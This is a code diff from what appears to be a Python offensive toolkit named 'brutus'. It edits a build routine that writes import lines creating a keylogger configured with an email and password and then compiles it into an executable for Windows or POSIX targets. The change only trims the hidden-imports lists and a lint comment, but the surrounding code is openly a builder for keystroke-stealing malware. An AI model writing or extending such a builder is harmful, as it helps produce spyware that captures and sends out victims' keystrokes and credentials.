@@ -56,32 +56,16 @@ def run() -> None:
     compiler.write_file_imports(
         lines=[
             'import Keylogger',
-            f'keylogger = Keylogger.Keylogger(interval={interval},email=\'{email}\',password=\'{password}\')',  # noqa: E501 pylint: disable=C0301
+            f'keylogger = Keylogger.Keylogger(interval={interval},email=\'{email}\',password=\'{password}\')',  # noqa:E501 pylint: disable=C0301
             'keylogger.start()',
         ]
     )
 
     try:
         if target == 'windows':
-            compiler.compile_for_windows(
-                hidden_imports=[
-                    'pynput',
-                    'brutus',
-                    'brutus.payloads',
-                    'brutus.payloads.keylogger',
-                    'brutus.payloads.keylogger.Keylogger',
-                ]
-            )
+            compiler.compile_for_windows(hidden_imports=['pynput'])
         else:
-            compiler.compile_for_posix(
-                hidden_imports=[
-                    'pynput',
-                    'brutus',
-                    'brutus.payloads',
-                    'brutus.payloads.keylogger',
-                    'brutus.payloads.keylogger.Keylogger',
-                ]
-            )
+            compiler.compile_for_posix(hidden_imports=['pynput'])
         LOGGER.info('')
         LOGGER.info(f'successfully compiled to {filename}')
         LOGGER.info(
